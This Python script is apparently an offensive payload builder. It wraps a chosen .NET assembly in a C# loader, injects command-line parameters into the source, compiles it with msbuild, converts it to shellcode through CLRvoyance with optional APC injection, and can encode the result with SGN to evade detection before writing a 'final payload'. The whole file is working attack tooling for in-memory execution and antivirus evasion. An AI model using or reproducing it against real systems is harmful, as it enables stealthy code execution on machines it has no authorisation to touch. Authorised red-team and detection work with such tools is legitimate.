import argparse
import os
import shutil

import CLRvoyance.CLRvoyance.clrvoyance as clrvoyance

class CLRvoyanceArgs():
    assembly = ''
    platform = ''
    dump = ''
    new_domain = ''
    apc = ''

    def __init__(self, assembly, platform, new_domain, apc):
        self.assembly = assembly
        self.platform = platform
        self.new_domain = new_domain
        self.apc = apc

def ReplaceString(stringa, stringb):
    file = open(wrapperSrc, "rt")
    data = file.read()
    data = data.replace(stringa, stringb)
    file.close()
    file = open(wrapperSrc, "wt")
    file.write(data)
    file.close()

# Parse Arguments
parser = argparse.ArgumentParser()
parser.add_argument('assembly', help='Target .NET assembly', metavar='path')
parser.add_argument('-a', '--architecture', metavar='[32|64]', default='64')
parser.add_argument('-e', '--encode', help='Encode with SGN', action='store_true', default=False, required=False)
parser.add_argument('-n', '--newdomain', help='Load assembly into a new domain', action='store_true', default=False, required=False)
parser.add_argument('-o', '--outfile', help='Default ./out.bin', default='./out.bin', required=False)
parser.add_argument('-p', '--parameters', help='Parameters to pass to provided .NET assembly. Example: -p=\'-group=remote -computername=ws01.corp.local\'', default=' ', required=False)
parser.add_argument('-s', '--safe', help='Use safe APC shellcode', action='store_true', default=False, required=False)
args = parser.parse_args()

# Setup
buildCommand = 'msbuild wrapper/wrapper -p:TargetFrameworkVersion=v4.5 -p:Configuration="Release" -p:Platform="{}" /verbosity:quiet'.format('x64' if args.architecture == '64' else 'x86')
print(buildCommand)
wrapperSrc = os.path.abspath('wrapper/wrapper/Program.cs')
wrapperAsm = os.path.abspath('wrapper/wrapper/bin/{0}/Release/wrapper.exe'.format('x64' if args.architecture == '64' else 'x86'))
targetAsm = os.path.abspath('wrapper/wrapper/assembly.exe')

# Copy Files
print(args)
shutil.copyfile(args.assembly, targetAsm)

# Replace Parameters
replaceVal = ''
params = args.parameters.split(' ')
for i in range(len(params)):
    if(i != len(params)-1):
        replaceVal += '"'+params[i]+'",'
    else:
        replaceVal += '"'+params[i]+'"'
ReplaceString('/*REPLACEME*/', replaceVal)

# Build
os.system(buildCommand)

# CLRvoyance
os.chdir('CLRvoyance/CLRvoyance')
cvArgs = CLRvoyanceArgs(wrapperAsm, args.architecture, args.newdomain, args.safe)
clrvoyance.run(cvArgs)

# Cleanup
ReplaceString(replaceVal, '/*REPLACEME*/')
os.remove(targetAsm)
os.chdir('../../')

# SGN Encoding
if(args.encode):
    print('Encoding with SGN, RWX memory required for initial shellcode execution')
    
    os.system('{0} -a {1} -plain-decoder {2}'.format(os.path.abspath('deps/sgn.exe'), args.architecture, wrapperAsm+'.shellcode'))
    os.remove(wrapperAsm+'.shellcode')
    shutil.move(wrapperAsm+'.shellcode.sgn', args.outfile)  
else:
    print('No encoding, no RWX memory')
    shutil.move(wrapperAsm+'.shellcode', args.outfile)

print('Final payload written to {0}'.format(args.outfile))
